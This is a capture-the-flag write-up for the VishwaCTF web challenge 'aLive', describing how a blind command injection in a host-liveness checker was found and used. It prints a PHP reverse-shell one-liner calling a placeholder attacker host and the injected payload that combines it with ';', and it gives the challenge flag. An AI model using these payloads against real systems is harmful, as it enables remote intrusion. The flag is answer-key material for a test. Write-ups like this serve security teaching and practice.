# **Writeup - VishwaCTF**

* Category **web** 
* Name **aLive** 
* Difficulty **Medium**


## Description

In my college level project I created this website that tells us if any domain/ip is active or not. But there is a catch.

<img width="1324" alt="image" src="https://user-images.githubusercontent.com/121932742/232243936-dce05fad-bcf9-43a6-a545-90b24288aacb.png">



## **Solution**

The proper method to solve this challenge was doing a **Blind Command Injection**.

![image](https://user-images.githubusercontent.com/121932742/232248816-cce317cd-807a-4d28-819a-66b9ae2b9629.png)

This is how the website functions 

Now lets try to play with it

![image](https://user-images.githubusercontent.com/121932742/232248852-8d8fc05b-850f-4fdf-aa32-4bc1dd4ac732.png)

FISHY!

Now this is a sign of a blind command injection, entering localhosts alone tells you that it is not active. But appending ;ls returns that it is active.

After inspecting the request I intercepted in burp suite I found this:
X-Powered-By: PHP/8.1.2–1ubuntu2.11

Which tells two things.
1- The OS is Ubuntu.
2- The website’s backend is PHP.
So I went to revshells.com and grabbed this reverse shell payload:

```php -r '$sock=fsockopen("ATTACKER.IP",1337);shell_exec("sh <&3 >&3 2>&3");'```

A nc listener is on as well as NGROK.
The final payload I sent to the web application is this:

```localhosts;php -r '$sock=fsockopen("ATTACKER.IP",1337);shell_exec("sh <&3 >&3 2>&3");```

![image](https://user-images.githubusercontent.com/121932742/232248650-06314a44-3ae8-4c64-8299-605317d9f6bb.png)




To print the flag, we can use the **cat** command or we can access to the directory (add /flag.txt to the URL). 

<img width="1030" alt="image" src="https://user-images.githubusercontent.com/121932742/232244112-9db4bf0c-79b4-4651-b9cd-5c950a6da4b2.png">


flag: **VishwaCTF{b1inD_cmd-i}**
